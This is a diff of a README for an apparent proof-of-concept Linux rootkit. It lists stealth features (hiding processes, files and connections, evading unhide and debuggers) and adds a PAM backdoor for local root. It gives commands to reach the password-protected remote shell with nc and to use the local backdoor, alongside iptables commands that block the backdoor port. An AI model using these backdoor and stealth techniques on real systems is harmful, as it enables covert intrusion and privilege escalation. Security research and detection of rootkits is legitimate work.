@@ -15,19 +15,24 @@ This poc is based on: [azazel](https://github.com/chokepoint/azazel)
 
 ## Features
 
-- Hide files and dirs
-- Hide process and connections
-- Open n remote pty (plaintext) with password
-- Avoids unhide
-- Avoids local sniffing
+- Hides processes, files, directories and network connections
+- Open remote terminal (plaintext) with password
+- Add PAM backdoor for local root access
+- Avoids unhide and local sniffing
 - Exit on debug
 
-## Access backdoor
+## Access remote backdoor
 
 ```sh
 nc <BACKDOOR-IP> <BACKDOOR-PORT>
 ```
 *enter the password!*
+
+## Access local backdoor
+
+```sh
+sudo -u <USER> -s
+```
 
 ## Checks
 
@@ -54,11 +59,11 @@ nc <BACKDOOR-IP> <BACKDOOR-PORT>
 
 - `sudo last`
 
-## Block backdoor
+## Block remote backdoor
 
 - `sudo iptables -A INPUT -p tcp --dport <BACKDOOR-PORT> -j DROP`
 
-## Unblock backdoor
+## Unblock remote backdoor
 
 - `sudo iptables -L -v -n --line-numbers`
 - `sudo iptables -D INPUT <NUM>`
